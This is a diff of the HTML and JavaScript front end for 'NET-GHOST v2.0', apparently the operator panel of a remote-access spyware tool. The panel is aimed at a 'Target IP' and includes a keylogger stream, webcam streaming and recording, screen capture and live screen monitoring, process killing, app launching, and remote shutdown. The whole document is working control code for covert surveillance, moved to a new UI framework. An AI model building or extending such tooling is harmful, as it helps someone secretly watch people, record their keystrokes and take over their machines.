@@ -3,219 +3,701 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER CONTROLLER v2.0</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <title>NET-GHOST v2.0</title>
+    <!-- Tailwind CSS v3 -->
+    <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet"/>
+    <!-- Font Awesome -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <!-- Tailwind Config -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'brand-cyan': '#00f3ff',
+                        'brand-purple': '#9333EA'
+                    },
+                    fontFamily: {
+                        'display': ['Orbitron', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    
     <style>
-        :root { --neon-blue: #00f3ff; --neon-red: #ff0055; --bg-black: #050505; --panel-bg: #111; }
-        body { background-color: var(--bg-black); color: #ccc; font-family: 'Consolas', 'Courier New', monospace; }
-        
-        /* Sidebar */
-        .sidebar { width: 260px; height: 100vh; position: fixed; background: var(--panel-bg); border-right: 1px solid #333; padding: 20px; z-index: 100; }
-        .brand { font-size: 24px; color: white; text-align: center; margin-bottom: 40px; text-shadow: 0 0 10px var(--neon-blue); }
-        .nav-btn { display: block; width: 100%; padding: 12px 15px; margin-bottom: 10px; background: transparent; border: 1px solid #333; color: #888; text-align: left; transition: 0.3s; cursor: pointer; border-radius: 4px; }
-        .nav-btn:hover, .nav-btn.active { background: rgba(0, 243, 255, 0.1); border-color: var(--neon-blue); color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 243, 255, 0.2); }
-        .nav-btn i { margin-right: 10px; width: 20px; text-align: center; }
+        body { font-family: 'Roboto', sans-serif; }
+        .panel { 
+            background-color: rgba(30, 41, 59, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+        }
+        .text-glow-cyan { text-shadow: 0 0 10px #00ffff, 0 0 15px #00ffff; }
+    
+        .screen-box img { 
+        max-width: 100%; 
+        max-height: 80vh; 
+        object-fit: contain; 
+        }
 
-        /* Content */
-        .main { margin-left: 260px; padding: 30px; }
-        .panel { background: var(--panel-bg); border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; display: none; animation: fadeIn 0.3s; }
-        .panel.active { display: block; }
+        .webcam-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6b7280;
+            font-size: 4rem;
+        }
+
+        /* Sidebar styles */
+        .sidebar { 
+            width: 260px; 
+            height: 100vh; 
+            position: fixed; 
+            background: #111; 
+            border-right: 1px solid #333; 
+            z-index: 100; 
+        }
+        .nav-btn {
+            display: block;
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            background: transparent;
+            border: 1px solid #333;
+            color: #888;
+            text-align: left;
+            transition: 0.3s;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .nav-btn:hover, .nav-btn.active {
+            background: rgba(0, 243, 255, 0.1);
+            border-color: #00ffff;
+            color: #00ffff;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
+        }
+        .nav-btn i { margin-right: 10px; width: 20px; text-align: center; }
+    
+        /* Content area */
+        .main-content {
+            margin-left: 260px; /* match .sidebar width */
+            box-sizing: border-box;
+            position: relative; /* keep normal flow, no forced stacking */
+        }
+
+        #keylog .max-w-full {
+            padding: 0;
+        }
+            
+        #keylog.log-terminal {
+            width: 100%;
+            max-width: 100%;
+            box-sizing: border-box;
+            margin: 0;
+            background: #000;
+            border: 1px solid #333;
+            color: #0f0;
+            height: 300px;
+            overflow-y: auto;
+            overflow-x: hidden; /* hide horizontal scroll; long lines will wrap */
+            padding: 10px;
+            font-size: 13px;
+            font-family: 'Consolas', monospace;
+            white-space: pre-wrap; /* preserve line breaks but allow wrapping */
+            word-break: break-word;
+            overflow-wrap: anywhere;
+            }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.3s; }
+
+        @media (max-width: 900px) {
+            .sidebar { width: 220px; }
+            .main-content { margin-left: 220px; }
+        }
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: translateY(10px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
         
-        /* Elements */
-        .status-bar { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
-        .screen-box { border: 2px dashed #444; min-height: 400px; display: flex; align-items: center; justify-content: center; background: #000; position: relative; }
-        .screen-box img { max-width: 100%; max-height: 80vh; }
-        .log-terminal { background: #000; border: 1px solid #333; color: #0f0; height: 300px; overflow-y: auto; padding: 10px; font-size: 13px; }
-        
-        /* Table */
+        /* Terminal/Table styles for other tabs */
+        .screen-box { 
+            border: 2px dashed #444; 
+            min-height: 400px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background: #000; 
+            position: relative;
+        }
+        .screen-box img { max-width: 100%; max-height: 80vh; object-fit: contain; }
+        .log-terminal { 
+            background: #000; 
+            border: 1px solid #333; 
+            color: #0f0; 
+            height: 300px; 
+            overflow-y: auto;
+            overflow-x: auto;
+            padding: 10px; 
+            font-size: 13px;
+            font-family: 'Consolas', monospace;
+            max-width: 100%;
+            width: 100%;
+            box-sizing: border-box;
+            word-break: break-all;
+            white-space: pre-wrap;
+        }
         .table-custom { color: #aaa; font-size: 14px; }
-        .table-custom thead { border-bottom: 2px solid #444; color: var(--neon-blue); }
+        .table-custom thead { border-bottom: 2px solid #444; color: #00ffff; }
         .table-custom td { border-bottom: 1px solid #222; padding: 8px; }
-        
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .btn-cyber { border: 1px solid var(--neon-blue); color: var(--neon-blue); background: transparent; padding: 5px 15px; transition: 0.3s; }
-        .btn-cyber:hover { background: var(--neon-blue); color: #000; box-shadow: 0 0 15px var(--neon-blue); }
-        .btn-danger-cyber { border: 1px solid var(--neon-red); color: var(--neon-red); background: transparent; padding: 5px 15px; }
-        .btn-danger-cyber:hover { background: var(--neon-red); color: #fff; box-shadow: 0 0 15px var(--neon-red); }
     </style>
 </head>
-<body>
+<body class="bg-black text-gray-200">
 
-<div class="sidebar">
-    <div class="brand"><i class="fa-solid fa-ghost"></i> NET-GHOST</div>
-    <button class="nav-btn active" onclick="showTab('dashboard')"><i class="fa-solid fa-chart-line"></i> Dashboard</button>
-    <button class="nav-btn" onclick="showTab('processes')"><i class="fa-solid fa-microchip"></i> Processes</button>
-    <button class="nav-btn" onclick="showTab('apps')"><i class="fa-brands fa-windows"></i> Applications</button>
-    <button class="nav-btn" onclick="showTab('screen')"><i class="fa-solid fa-desktop"></i> Screen View</button>
-    <button class="nav-btn" onclick="showTab('webcam')"><i class="fa-solid fa-video"></i> Webcam</button>
-    <button class="nav-btn" onclick="showTab('keylog')"><i class="fa-solid fa-keyboard"></i> Keylogger</button>
+<!-- SIDEBAR -->
+<div class="sidebar p-5">
+    <div class="text-center mb-10">
+        <h1 class="text-2xl font-display text-white" style="text-shadow: 0 0 10px #00ffff;">
+            <i class="fa-solid fa-ghost"></i> NET-GHOST
+        </h1>
+        <p class="text-xs text-gray-500 mt-2">v2.0</p>
+    </div>
+    
+    <button class="nav-btn active" onclick="showTab('dashboard', this)">
+        <i class="fa-solid fa-chart-line"></i> Dashboard
+    </button>
+    <button class="nav-btn" onclick="showTab('processes', this)">
+        <i class="fa-solid fa-microchip"></i> Processes
+    </button>
+    <button class="nav-btn" onclick="showTab('apps', this)">
+        <i class="fa-brands fa-windows"></i> Applications
+    </button>
+    <button class="nav-btn" onclick="showTab('screen', this)">
+        <i class="fa-solid fa-desktop"></i> Screen View
+    </button>
+    <button class="nav-btn" onclick="showTab('webcam', this)">
+        <i class="fa-solid fa-video"></i> Webcam
+    </button>
+    <button class="nav-btn" onclick="showTab('keylog', this)">
+        <i class="fa-solid fa-keyboard"></i> Keylogger
+    </button>
     
     <div style="position: absolute; bottom: 20px; width: 85%; text-align: center;">
-        <small class="text-muted">Target IP</small><br>
-        <span style="color: var(--neon-blue); font-weight: bold;">{{ ip }}</span>
+        <small class="text-gray-500">Target IP</small><br>
+        <span class="text-brand-cyan font-bold text-glow-cyan">{{ ip }}</span>
     </div>
 </div>
 
-<div class="main">
-    
-    <!-- DASHBOARD -->
-    <div id="dashboard" class="panel active">
-        <div class="status-bar">
-            <h4><i class="fa-solid fa-shield-halved"></i> SYSTEM CONTROL</h4>
-            <span class="badge bg-success">CONNECTED</span>
+<!-- MAIN CONTENT AREA -->
+<div class="main-content p-4 sm:p-6 lg:p-8">
+
+    <!-- DASHBOARD TAB -->
+    <div id="dashboard" class="tab-content active">
+        <div class="max-w-7xl mx-auto">
+            <header class="mb-8">
+                <h2 class="text-2xl font-bold tracking-wider uppercase text-gray-300">System Overview Dashboard</h2>
+            </header>
+            
+            <main class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
+                
+                <!-- Power Management Panel -->
+                <section class="panel border border-brand-cyan glow-cyan p-5">
+                    <h3 class="text-lg font-semibold text-brand-cyan mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-power-off"></i> Power Management
+                    </h3>
+                    <div class="grid gap-3">
+                        <button onclick="control('SHUTDOWN')" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg transition-colors duration-300 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-power-off"></i> Shutdown
+                        </button>
+                        <button onclick="control('RESTART')" class="w-full bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-3 px-4 rounded-lg transition-colors duration-300 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-rotate-right"></i> Restart
+                        </button>
+                        <button onclick="control('SLEEP')" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition-colors duration-300 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-moon"></i> Sleep
+                        </button>
+                    </div>
+                </section>
+                
+                <!-- Connection Status Panel -->
+                <section class="panel border border-purple-500 p-5">
+                    <h3 class="text-lg font-semibold text-purple-400 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-network-wired"></i> Connection Status
+                    </h3>
+                    <div class="space-y-3">
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Target IP:</span>
+                            <span class="font-mono text-brand-cyan">{{ ip }}</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Status:</span>
+                            <span class="font-semibold text-green-400" id="connection-status">Connected</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Uptime:</span>
+                            <span class="font-mono text-gray-300" id="uptime">--</span>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- System Stats Panel -->
+                <section class="panel border border-green-500 p-5">
+                    <h3 class="text-lg font-semibold text-green-400 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-microchip"></i> System Performance
+                    </h3>
+                    <div class="space-y-3">
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">CPU Usage:</span>
+                            <span class="font-mono text-yellow-400" id="cpu-usage">--</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Memory:</span>
+                            <span class="font-mono text-blue-400" id="memory-usage">--</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Processes:</span>
+                            <span class="font-mono text-gray-300" id="process-count">--</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Disk Usage:</span>
+                            <span class="font-mono text-purple-400" id="disk-usage">--</span>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Keylogger Stats Panel -->
+                <section class="panel border border-yellow-500 p-5">
+                    <h3 class="text-lg font-semibold text-yellow-400 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-keyboard"></i> Keylogger Stats
+                    </h3>
+                    <div class="space-y-3">
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Status:</span>
+                            <span class="font-semibold text-red-400" id="keylog-status">Inactive</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Keys Logged:</span>
+                            <span class="font-mono text-brand-cyan" id="keys-logged">0</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Last Activity:</span>
+                            <span class="font-mono text-gray-400" id="last-activity">Never</span>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Live Screen Monitor Panel -->
+                <section class="panel border border-pink-500 p-5">
+                    <h3 class="text-lg font-semibold text-pink-400 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-tv"></i> Live Screen Monitor
+                    </h3>
+                    <div class="space-y-3">
+                        <!-- Live screen preview (mini) -->
+                        <div class="w-full h-32 bg-gray-900 border border-gray-700 rounded overflow-hidden relative">
+                            <img id="screen-live-thumb" src="" alt="Live Screen" 
+                                style="width:100%; height:100%; object-fit:cover; display:none;">
+                            <div id="screen-live-placeholder" class="w-full h-full flex flex-col items-center justify-center text-gray-600 text-sm gap-2">
+                                <i class="fa-solid fa-tv text-3xl"></i>
+                                <span class="text-xs">Start live monitoring</span>
+                            </div>
+                            <div id="screen-fps" class="absolute top-1 left-1 bg-black bg-opacity-70 text-xs text-green-400 px-2 py-1 rounded" style="display:none;">
+                                <i class="fa-solid fa-circle text-red-500 animate-pulse"></i> LIVE
+                            </div>
+                        </div>
+                        
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Stream Status:</span>
+                            <span class="font-mono text-red-400" id="screen-stream-status">Offline</span>
+                        </div>
+                        
+                        <button id="screen-stream-btn" onclick="toggleScreenStream()" 
+                                class="w-full px-3 py-2 rounded text-sm font-bold bg-green-600 hover:bg-green-700 text-white">
+                            <i class="fa-solid fa-play mr-1"></i> START MONITORING
+                        </button>
+                    </div>
+                </section>
+                
+                <!-- Network Monitor Panel -->
+                <section class="panel border border-orange-500 p-5">
+                    <h3 class="text-lg font-semibold text-orange-400 mb-4 flex items-center gap-2">
+                        <i class="fa-solid fa-network-wired"></i> Network Monitor
+                    </h3>
+                    <div class="space-y-3">
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Download:</span>
+                            <span class="font-mono text-green-400" id="net-download">-- MB/s</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Upload:</span>
+                            <span class="font-mono text-blue-400" id="net-upload">-- MB/s</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Connections:</span>
+                            <span class="font-mono text-gray-300" id="net-connections">--</span>
+                        </div>
+                        <div class="flex justify-between items-center">
+                            <span class="text-gray-400">Total Sent:</span>
+                            <span class="font-mono text-gray-400 text-xs" id="net-total-sent">-- GB</span>
+                        </div>
+                    </div>
+                </section>
+            </main>
         </div>
-        <div class="row">
-            <div class="col-md-6">
-                <div class="card bg-dark border-secondary p-3 mb-3">
-                    <h5>Power Management</h5>
-                    <p class="text-muted">Critical system actions</p>
-                    <div class="d-grid gap-2">
-                        <button onclick="control('SHUTDOWN')" class="btn btn-danger-cyber"><i class="fa-solid fa-power-off"></i> SHUTDOWN TARGET</button>
-                        <button onclick="control('RESTART')" class="btn btn-cyber"><i class="fa-solid fa-rotate"></i> RESTART TARGET</button>
+    </div>
+
+    <!-- PROCESSES TAB -->
+    <div id="processes" class="tab-content">
+        <div class="bg-gray-900 border border-gray-700 p-6 rounded-lg">
+            <div class="flex justify-between items-center mb-6 pb-4 border-b border-gray-700">
+                <h3 class="text-xl font-bold text-brand-cyan">
+                    <i class="fa-solid fa-microchip mr-2"></i>Running Processes
+                </h3>
+                <button onclick="loadList('processes')" class="bg-brand-cyan text-black px-6 py-2 rounded font-bold hover:bg-cyan-400">
+                    <i class="fa-solid fa-rotate mr-2"></i>REFRESH
+                </button>
+            </div>
+            <div style="height: 500px; overflow: auto;">
+                <table class="w-full table-custom">
+                    <thead><tr><th class="text-left p-2">Name</th><th class="text-left p-2">PID</th><th class="text-left p-2">Memory</th></tr></thead>
+                    <tbody id="proc-list"><tr><td colspan="3" class="text-center p-4">Click REFRESH to load</td></tr></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- APPS TAB -->
+    <div id="apps" class="tab-content">
+        <div class="bg-gray-900 border border-gray-700 p-6 rounded-lg">
+            <div class="flex justify-between items-center mb-6 pb-4 border-b border-gray-700">
+                <h3 class="text-xl font-bold text-brand-cyan">
+                    <i class="fa-brands fa-windows mr-2"></i>Installed Applications
+                </h3>
+                <div class="flex gap-3">
+                    <input id="appPathInput" type="text" placeholder="Enter app path..." class="bg-gray-800 text-white px-4 py-2 rounded border border-gray-600 w-80">
+                    <button onclick="control('APP_START', document.getElementById('appPathInput').value)" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded font-bold">
+                        <i class="fa-solid fa-play mr-2"></i>START APP
+                    </button>
+                    <button onclick="loadList('apps')" class="bg-brand-cyan text-black px-6 py-2 rounded font-bold hover:bg-cyan-400">
+                        <i class="fa-solid fa-rotate mr-2"></i>REFRESH
+                    </button>
+                </div>
+            </div>
+            <div style="height: 500px; overflow: auto;">
+                <table class="w-full table-custom">
+                    <thead><tr><th class="text-left p-2">Name</th><th class="text-left p-2">Version</th><th class="text-left p-2">Location</th></tr></thead>
+                    <tbody id="app-list"><tr><td colspan="3" class="text-center p-4">Click REFRESH to load</td></tr></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN TAB -->
+    <div id="screen" class="tab-content">
+        <div class="bg-gray-900 border border-gray-700 p-6 rounded-lg">
+            <div class="flex justify-between items-center mb-6 pb-4 border-b border-gray-700">
+                <h3 class="text-xl font-bold text-brand-cyan"><i class="fa-solid fa-desktop mr-2"></i>Screen Capture</h3>
+                <button onclick="captureScreen()" class="bg-brand-cyan text-black px-6 py-2 rounded font-bold hover:bg-cyan-400">
+                    <i class="fa-solid fa-camera mr-2"></i>CAPTURE NOW
+                </button>
+            </div>
+            <div class="screen-box">
+                <span id="screen-msg" class="text-gray-500">Click CAPTURE NOW to take a screenshot</span>
+                <img id="screen-img" alt="Screenshot" style="display: none;">
+            </div>
+        </div>
+    </div>
+
+    <!-- WEBCAM TAB -->
+    <div id="webcam" class="tab-content">
+        <div class="bg-gray-900 border border-gray-700 p-6 rounded-lg">
+            <div class="flex justify-between items-center mb-6 pb-4 border-b border-gray-700">
+                <h3 class="text-xl font-bold text-brand-cyan"><i class="fa-solid fa-video mr-2"></i>Webcam Stream</h3>
+                <div class="flex gap-3">
+                    <button onclick="toggleCam(true)" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded font-bold">START STREAM</button>
+                    <button onclick="toggleRecord('start')" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded font-bold">START REC</button>
+                    <button onclick="toggleRecord('stop')" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded font-bold">STOP REC</button>
+                    <button onclick="toggleCam(false)" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded font-bold">STOP STREAM</button>
+                </div>
+            </div>
+                <div class="screen-box">
+                    <img id="cam-img" alt="Webcam Feed" style="display:none;">
+                    <div id="cam-placeholder" class="webcam-placeholder">
+                        <i class="fa-solid fa-video-slash"></i>
                     </div>
                 </div>
             </div>
-            <div class="col-md-6">
-                <div class="card bg-dark border-secondary p-3">
-                    <h5>Connection Info</h5>
-                    <p>Status: <span class="text-success">Online (LAN)</span></p>
-                    <p>Mail Module: <span class="text-warning">Active (Hybrid)</span></p>
-                    <p>Protocol: <span class="text-info">TCP/IP Custom</span></p>
+        </div>
+
+    <!-- KEYLOGGER TAB -->
+<div id="keylog" class="tab-content">
+    <div class="max-w-full">
+        <div class="bg-gray-900 border border-gray-700 rounded-lg overflow-hidden">
+            <!-- Header -->
+            <div class="flex justify-between items-center p-4 border-b border-gray-700">
+                <h3 class="text-xl font-bold text-brand-cyan">
+                    <i class="fa-solid fa-keyboard mr-2"></i>Keylogger Stream
+                </h3>
+                <div class="flex gap-2">
+                    <button onclick="toggleKey(true)" class="bg-green-600 hover:bg-green-700 text-white px-3 py-2 rounded text-sm font-bold">
+                        <i class="fa-solid fa-play mr-1"></i>START
+                    </button>
+                    <button onclick="toggleKey(false)" class="bg-red-600 hover:bg-red-700 text-white px-3 py-2 rounded text-sm font-bold">
+                        <i class="fa-solid fa-stop mr-1"></i>STOP
+                    </button>
+                    <button onclick="clearKeylog()" class="bg-gray-600 hover:bg-gray-700 text-white px-3 py-2 rounded text-sm font-bold">
+                        <i class="fa-solid fa-trash mr-1"></i>CLEAR
+                    </button>
                 </div>
             </div>
+            
+            <!-- Terminal -->
+            <div id="key-term" class="log-terminal"></div>
         </div>
     </div>
-
-    <!-- PROCESSES -->
-    <div id="processes" class="panel">
-        <div class="status-bar">
-            <h4>PROCESS MANAGER</h4>
-            <div>
-                <input type="text" id="pidInput" placeholder="Enter PID..." class="bg-dark text-white border-secondary p-1">
-                <button onclick="control('STOP', document.getElementById('pidInput').value)" class="btn btn-danger-cyber btn-sm">KILL</button>
-                <button onclick="loadList('processes')" class="btn btn-cyber btn-sm"><i class="fa-solid fa-rotate"></i> REFRESH</button>
-            </div>
-        </div>
-        <div style="height: 500px; overflow: auto;">
-            <table class="table table-custom w-100">
-                <thead><tr><th>NAME</th><th>PID</th><th>MEMORY</th></tr></thead>
-                <tbody id="proc-list"></tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- APPS -->
-    <div id="apps" class="panel">
-        <div class="status-bar">
-            <h4>INSTALLED APPLICATIONS</h4>
-            <div>
-                <input type="text" id="appPathInput" placeholder="App Path/Name..." class="bg-dark text-white border-secondary p-1">
-                <button onclick="control('APP_START', document.getElementById('appPathInput').value)" class="btn btn-cyber btn-sm">START APP</button>
-                <button onclick="loadList('apps')" class="btn btn-cyber btn-sm">REFRESH</button>
-            </div>
-        </div>
-        <div style="height: 500px; overflow: auto;">
-            <table class="table table-custom w-100">
-                <thead><tr><th>APP NAME</th><th>VERSION</th><th>PATH</th></tr></thead>
-                <tbody id="app-list"></tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- SCREEN -->
-    <div id="screen" class="panel">
-        <div class="status-bar">
-            <h4>SCREEN SPY</h4>
-            <button onclick="captureScreen()" class="btn btn-cyber"><i class="fa-solid fa-camera"></i> CAPTURE</button>
-        </div>
-        <div class="screen-box">
-            <img id="screen-img" src="" style="display: none;">
-            <span id="screen-msg" class="text-muted">Waiting for capture...</span>
-        </div>
-    </div>
-
-    <!-- WEBCAM -->
-    <div id="webcam" class="panel">
-        <div class="status-bar">
-            <h4>WEBCAM STREAM</h4>
-            <div>
-                <button onclick="toggleCam(true)" class="btn btn-success btn-sm">START STREAM</button>
-                <button onclick="toggleRecord('start')" class="btn btn-warning btn-sm">🔴 RECORD</button>
-                <button onclick="toggleRecord('stop')" class="btn btn-secondary btn-sm">⏹ STOP RECORD</button>
-                <button onclick="toggleCam(false)" class="btn btn-danger btn-sm">STOP STREAM</button>
-            </div>
-        </div>
-        <div class="screen-box">
-            <img id="cam-img" src="" alt="Webcam OFF">
-        </div>
-    </div>
-
-    <!-- KEYLOGGER -->
-    <div id="keylog" class="panel">
-        <div class="status-bar">
-            <h4>KEYSTROKE LOGGER</h4>
-            <div>
-                <button onclick="toggleKey(true)" class="btn btn-warning btn-sm">START</button>
-                <button onclick="toggleKey(false)" class="btn btn-secondary btn-sm">STOP</button>
-                <button onclick="clearKeylog()" class="btn btn-outline-light btn-sm">CLEAR</button>
-            </div>
-        </div>
-        <div id="key-term" class="log-terminal">Waiting for input stream...</div>
-    </div>
-
 </div>
 
 <script>
     let eventSource = null;
     let isKeyloggerActive = false;
+    let dashboardInterval = null;
+    
+    // Global state
+    let webcamActive = localStorage.getItem('webcamActive') === 'true';
+    let lastScreenshotTime = localStorage.getItem('lastScreenshotTime') ? parseInt(localStorage.getItem('lastScreenshotTime')) : null;
 
-    function showTab(id) {
-        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    // TAB SWITCHING - FIX: Pass button reference as parameter
+        function showTab(id, buttonElement) {
+        // Hide all tab contents
+        document.querySelectorAll('.tab-content').forEach(p => p.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-        event.currentTarget.classList.add('active');
+        
+        // Update navigation buttons - only if called from nav button
+        if (buttonElement) {
+            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+            buttonElement.classList.add('active');
+        }
+        
+        // Restore webcam when switching to webcam tab
+        if (id === 'webcam' && webcamActive) {
+            const img = document.getElementById('cam-img');
+            if (img && img.dataset.streaming !== 'true') {
+                tryRestoreWebcam(1);
+            }
+        }
+        
+        // Restore screenshot when switching to screen tab
+        // FIX: Không tự động load lại - chỉ hiển thị nếu đã có trong bộ nhớ
+        if (id === 'screen') {
+            const savedUrl = localStorage.getItem('lastScreenshotUrl');
+            const img = document.getElementById('screen-img');
+            const msg = document.getElementById('screen-msg');
+            
+            if (savedUrl && img) {
+                // Chỉ hiển thị cached image, KHÔNG gọi API mới
+                const cachedSrc = img.dataset.cachedSrc;
+                if (cachedSrc && cachedSrc === savedUrl) {
+                    img.style.display = 'block';
+                    msg.style.display = 'none';
+                } else {
+                    // Image chưa load hoặc đã bị clear - hiển thị message
+                    img.style.display = 'none';
+                    msg.style.display = 'block';
+                    msg.innerText = "Click CAPTURE NOW to take a screenshot";
+                }
+            }
+        }
     }
 
+    // DASHBOARD STATS UPDATE
+    function updateDashboardStats() {
+        // System stats
+        fetch('/api/system/stats')
+            .then(r => r.json())
+            .then(data => {
+                const cpuEl = document.getElementById('cpu-usage');
+                const memEl = document.getElementById('memory-usage');
+                const uptimeEl = document.getElementById('uptime');
+                const procEl = document.getElementById('process-count');
+                const diskEl = document.getElementById('disk-usage');
+                
+                if (cpuEl) cpuEl.innerText = data.cpu_percent + '%';
+                if (memEl) memEl.innerText = data.mem_used_gb + ' / ' + data.mem_total_gb + ' GB';
+                if (uptimeEl) uptimeEl.innerText = data.uptime;
+                if (procEl) procEl.innerText = data.process_count;
+
+                if (diskEl && data.disk_used_gb) {
+                    diskEl.innerText = data.disk_used_gb + ' / ' + data.disk_total_gb + ' GB (' + data.disk_percent + '%)';
+                }
+            })
+            .catch(err => console.error('System stats error:', err));
+        
+        // Keylog stats
+        fetch('/api/keylog/stats')
+            .then(r => r.json())
+            .then(data => {
+                const statusEl = document.getElementById('keylog-status');
+                const keysEl = document.getElementById('keys-logged');
+                const activityEl = document.getElementById('last-activity');
+                
+                if (statusEl) {
+                    statusEl.innerText = data.is_running ? 'Active' : 'Inactive';
+                    statusEl.className = data.is_running ? 'font-semibold text-green-400' : 'font-semibold text-red-400';
+                }
+                if (keysEl) keysEl.innerText = data.total_keys;
+                if (activityEl) activityEl.innerText = data.last_activity;
+            })
+            .catch(err => console.error('Keylog stats error:', err));
+        
+        // Recent apps
+        fetch('/api/apps/recent')
+            .then(r => r.json())
+            .then(apps => {
+                const listEl = document.getElementById('recent-apps-list');
+                const countEl = document.getElementById('apps-count');
+                
+                if (listEl) {
+                    listEl.innerHTML = apps.map(app => 
+                        `<div class="flex items-center gap-2 p-2 hover:bg-gray-800 rounded cursor-pointer">
+                            <i class="${app.icon} text-brand-cyan"></i>
+                            <span>${app.name}</span>
+                        </div>`
+                    ).join('');
+                }
+                if (countEl) countEl.innerText = apps.length + ' apps';
+            })
+            .catch(err => console.error('Recent apps error:', err));
+            
+        // Network stats
+        fetch('/api/network/stats')
+            .then(r => r.json())
+            .then(data => {
+                const downloadEl = document.getElementById('net-download');
+                const uploadEl = document.getElementById('net-upload');
+                const connectionsEl = document.getElementById('net-connections');
+                const totalSentEl = document.getElementById('net-total-sent');
+                
+                if (downloadEl) downloadEl.innerText = data.download_speed_mb + ' MB/s';
+                if (uploadEl) uploadEl.innerText = data.upload_speed_mb + ' MB/s';
+                if (connectionsEl) connectionsEl.innerText = data.connections;
+                if (totalSentEl) totalSentEl.innerText = data.total_sent_gb + ' GB';
+            })
+            .catch(err => console.error('Network stats error:', err));
+
+        // Webcam status
+        const webcamStatusEl = document.getElementById('webcam-status');
+        if (webcamStatusEl) {
+            webcamStatusEl.innerText = webcamActive ? 'Active' : 'Inactive';
+            webcamStatusEl.className = webcamActive ? 'font-semibold text-green-400' : 'font-semibold text-red-400';
+        }
+        
+        // Last screenshot time
+        const screenshotEl = document.getElementById('last-screenshot');
+        if (screenshotEl && lastScreenshotTime) {
+            const diff = Math.floor((Date.now() - lastScreenshotTime) / 1000);
+            let timeAgo;
+            if (diff < 60) timeAgo = diff + 's ago';
+            else if (diff < 3600) timeAgo = Math.floor(diff / 60) + 'm ago';
+            else timeAgo = Math.floor(diff / 3600) + 'h ago';
+            screenshotEl.innerText = timeAgo;
+        }
+    }
+
+    // CONTROL FUNCTIONS
     async function control(cmd, arg='') {
         if((cmd=='SHUTDOWN' || cmd=='RESTART') && !confirm('Confirm action?')) return;
+        if(cmd === 'APP_START' && !arg.trim()) {
+            alert('Please enter an application path or name');
+            return;
+        }
+        
         await fetch('/api/control', {
-            method:'POST', headers:{'Content-Type':'application/json'},
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
